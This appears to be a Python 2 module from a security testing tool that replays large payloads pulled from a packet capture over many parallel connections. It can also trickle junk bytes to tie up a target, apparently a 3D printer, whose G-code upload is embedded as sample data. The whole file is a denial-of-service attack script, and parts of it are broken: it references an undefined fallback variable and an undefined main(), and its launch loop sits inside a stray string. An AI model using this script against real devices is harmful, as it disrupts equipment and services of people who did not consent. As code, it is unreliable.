#!/usr/bin/python

import socket
from time import sleep
import threading
import sys, signal
import argparse
import resource
from scapy.all import *

# sample data taken from pcap
sample_Gcode=['~M28 36133094 0:/user/Demo.gx\x0d\x0a', 'ZZ\xa5\xa5'+('\x00'*6)+'\x10\x00\x10\x1a\xe0\x11xgcode 1.0\x0a'+('\x00'*5)+':'+('\x00'*3)+'\xb08\x00\x00\xb08\x00\x00\x81\xc7\x00\x006\xcf'+('\x00'*6)+'\x09\x00\xb4\x00\x0f\x00\x02\x00\x3c'+('\x00'*3)+'\xdc'+('\x00'*3)+'\x02\x01BMv8'+('\x00'*6)+'6'+('\x00'*3)+'('+('\x00'*3)+'P'+('\x00'*3)+'\x3c'+('\x00'*3)+'\x01\x00\x18'+('\x00'*5)+'@8\x00\x00\x13\x0b\x00\x00\x13\x0b'+('\x00'*1330)]

streams = []

count = 0
lock = threading.Lock()

def worker(num, ip, port, data, slow=False, addJunk=False, dontListen=True, F170=False):
    connected=False
    listen=not dontListen
    while (not connected):
        try:
            lock.acquire()        
            print 'Worker #%3d Starting' % int(num)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            print "Connection #%3d Setup" % int(num)
            connected=True
            lock.release()
        except:
            print "Connected #%3d Setup Refused" % int(num)
        finally:
            if lock.locked():
                lock.release()
    try:
        while True:
            if not slow:
                if F170:
                    for msg in data[0]:
                        s.send(msg)
                        sleep(0.2)
                    for i in range(0,2):
                        response=s.recv(64)
                    for msg in data[1]:
                        s.send(msg)
                        sleep(0.2)
                    s.send(response)
                    sleep(0.1)
                    s.send(data[2][0])
                    sleep(0.1)
                    s.send(data[3][0])
                    if listen:
                        #receive data sent from printer--not sure you have to do this...
                        response=s.recv(64)
                        response=s.recv(64)                        
                        response=s.recv(8192)
                        print(response)
                    if addJunk:
                        response=s.recv(64)
                        response=s.recv(64)                        
                        while True:
                            s.send('a')
                            sleep(4.9)
                elif not F170:
                    if len(data)>1:
                        for i in range(0, len(data)-1):
                            if isinstance(data[i], str):
                                s.send(data[i])
                            elif isinstance(data[i], list):
                                for j in range(0, len(data[i])):
                                    s.send(data[i][j])
                            if listen:
                                response=s.recv(8192)
                        s.send(data[-1])
                        if addJunk:
                            while True:
                                s.send('a')
                                #sleep(58)
                        response=s.recv(8192)
                    else:
                        s.send(data[0])
                        if addJunk:
                            while True:
                                s.send('a')
                                #sleep(1)
                        sleep(1)
            elif slow:
                if len(data)>1:
                    s.send(data[0])
                    response=s.recv(8192)
                    for i in data[1]:
                        s.send(i)
                        sleep(0.9)
                        if addJunk:
                            while True:
                                s.send('a')
                                sleep(1)
                    sleep(1)
                response=s.recv(8192)                
    except KeyboardInterrupt:
        print('exiting')
    finally:
        s.close()

# Find first large payload, add its packet and the preceding packet to data
# OR if there are multiple TCP sessions, use the entire TCP session to DoS
def extract_first_large_payload(pcapData, sender, receiver):
    prev_pkt = None
    for pkt in pcapData:
            if pkt.haslayer(TCP) and pkt.haslayer(IP):
                if (pkt[IP].src==sender and pkt[IP].dst==receiver):
                    if(len(pkt[TCP].payload)>1024):
                        first_large_payload = pkt[TCP].payload
                        #print(first_large_payload)
                        return [prev_payload, first_large_payload]
                    else:
                        prev_payload = pkt[TCP].payload
            elif pkt.haslayer(TCP) and pkt.haslayer(IPv6):
                if (pkt[IPv6].src==sender and pkt[IPv6].dst==receiver):
                    if(len(pkt[TCP].payload)>1024):
                        first_large_payload=pkt[TCP].payload
                        #print(first_large_payload)
                        return [prev_payload, first_large_payload]
                    else:
                        prev_payload = pkt[TCP].payload
    return None

def run(pcapData, hostData, test_rec, outfile):
    print("\tRunning DoS tests using large data packets")
    resource.setrlimit(resource.RLIMIT_NOFILE, (4000, 4000))
    
    num_connections=100

    #test_rec = User-selected boolean to test the "receiver" IP address, else test "sender"
    if test_rec is True:
        ip = hostData.receiver
        port = hostData.rec_port[0]
    else:
        ip = hostData.sender
        port = hostData.send_port[0]

    if test_rec:
        data = extract_first_large_payload(pcapData, hostData.sender, hostData.receiver)
    else:
        data = extract_first_large_payload(pcapData, hostData.receiver, hostData.sender)

    print(str(data))
    if data is None:
        data=sample_Finder[0]
    
    threads = []
'''
    for i in range(num_connections):
        t = threading.Thread(target=worker, args=(i, ip, port, data, False, False, True, False))
        threads.append(t)
        t.start()
        sleep(0.01)

    for i in range(num_connections):
        threads[i].join(1000)

    print "All Threads Done!"

if __name__=='__main__':
    main()
'''
